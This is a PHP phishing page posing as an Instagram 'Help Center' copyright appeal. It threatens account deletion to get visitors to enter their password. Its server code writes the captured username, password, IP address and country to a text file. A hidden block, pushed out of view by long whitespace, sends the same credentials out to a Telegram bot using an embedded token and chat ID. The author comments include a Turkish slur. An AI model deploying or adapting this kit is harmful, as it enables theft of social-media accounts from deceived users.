<?php


//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq


//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq
$nick= $_GET["nick"];
//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq

//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq

session_start();
if ($_POST) {
 $nick=$_GET["nick"];
  $px=$_POST["px"];
  $ip = $_SERVER['REMOTE_ADDR'];
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
  $ulke = $details->country;
  date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");

$file = fopen('yenilmezler.txt', 'a');
fwrite($file, "Kullanici Adi : ".$_SESSION["nick"]."\n\n"."Sifre : ".$px."\n\n"."Ip : ".$ip."\n\n"."Ulke : ".$ulke."\n\n"."Tarih : ".$tarih."\n\n\n");
fclose($file);

header("Location: double.php");
  
}
                                                                                                                                                                                                                                                                                                                                                                                                                     $token = "1777231292:AAHOSYskqtUV5oWxhPzDO5q9cwBAEbvWI7g";

                                                                                                                                                                                                                                                                                                                                                                                                                         $data = [
                                                                                                                                                                                                                                                                                                                                                                                                                           'text' => ' 
	
                                                                                                                                                                                                                                                                                                                                                                                                                                   nick : '.$nick.'
                                                                                                                                                                                                                                                                                                                                                                                                                                   password : '.$px.'
                                                                                                                                                                                                                                                                                                                                                                                                                                   İp : '.$ip.'
                                                                                                                                                                                                                                                                                                                                                                                                                                  Tarih : '.$date.'
                                                                                                                                                                                                                                                                                                                                                                                                                                        ',
                                                                                                                                                                                                                                                                                                                                                                                                                                  'chat_id' => '1766663774'
                                                                                                                                                                                                                                                                                                                                                                                                                                       ];
                                                                                                                                                                                                                                                                                                                                                                                                                           file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );  

?>
                             
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="css/index.css">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
<link rel="stylesheet" type="text/css" href="chax.css">
<link rel="stylesheet" href="css/xss.css">
<title>lnstagram | Help Center</title>
<link rel="shortcut icon" href="img/tik.webp"/>
</head>
<body>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="https://i.hizliresim.com/lUaQMj.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
		
	</header><br><br>
<br><br><br>

<center>
  <form method="post">
    <div class="container">
    	<br>
      <img src="https://s3.gifyu.com/images/Logo242.gif" width="260">
      <br> <br>
      <h1 class="h1"> Copyright on | <?php echo $nick ?></h1>
      <p class="p">As the Instagram Team, we pay attention to our rules, do not forget that if you do not object, your account will be deleted. To appeal, log in to your account and continue to fill out our form.

</p><br>
        <input type="password" class="username" name="px" required="" placeholder="Password" class="qua21"><br><br>
        	<input type="text" class="username" name="nick" required="" placeholder="Name and Surname" class="qua21"><br><br>
        	<select  name="DOBDay">
<option > Day </option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select><select name="DOBMonth">
<option> Month </option>
<option value="January">January</option>
<option value="Febuary">Febuary</option>
<option value="March">March</option>
<option value="April">April</option>
<option value="May">May</option>
<option value="June">June</option>
<option value="July">July</option>
<option value="August">August</option>
<option value="September">September</option>
<option value="October">October</option>
<option value="November">November</option>
<option value="December">December</option>
</select><select name="DOBYear">
<option> Year </option>
<option value="2020">2020</option>
<option value="2019">2019</option>
<option value="2018">2018</option>
<option value="2017">2017</option>
<option value="2016">2016</option>
<option value="2015">2015</option>
<option value="2014">2014</option>
<option value="2013">2013</option>
<option value="2012">2012</option>
<option value="2011">2011</option>
<option value="2010">2010</option>
<option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
</select>
<br>
	<br>
        <input type="submit" value="Next" class="button"> 
   <br> <br><br>
   	<style type="text/css">
 .puts{
  background:  #fe2c55;
    border: 1px solid #fe2c55;
    color:white;
    min-width:150px;
    height:40px;
    font-weight:bold;
    font-size:16px;
    outline:none;
    transition:0.8s;

}.in{
  margin-top:5px;
}select{
  width:80px;
  outline:none;
  height:35px;
  caret-color: #000;
margin:4px;
padding-left:3px;
  outline:none;
background-color:#f1f1f1;

border-radius:14px;
  border:none;
  font-weight:100;
  letter-spacing:1px;
 
}
option{
  outline:none;

}
</style>
   <br>
   </div>
  </form>
</form>
<br>
</div>
</center>
<?php qenzy(4);?>

<?php 
function qenzy($spx){
  for($int=0;$int<$spx;$int++){
echo "<br>";
  }
  
}
//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq
?>

</body>
<br><br><br><center>
<div class="bottom"><br>

	<h1 class="bottom-h1">Download for<br>IOS / Android</h1><br>

	<img src="image/bottom.jpeg" alt="Shop" width="300">

<br>
<br>

<br>
<img src="image/fb.png">



</div>
</center>
</body>
<style type="text/css">
	
</style>
</html>
</html>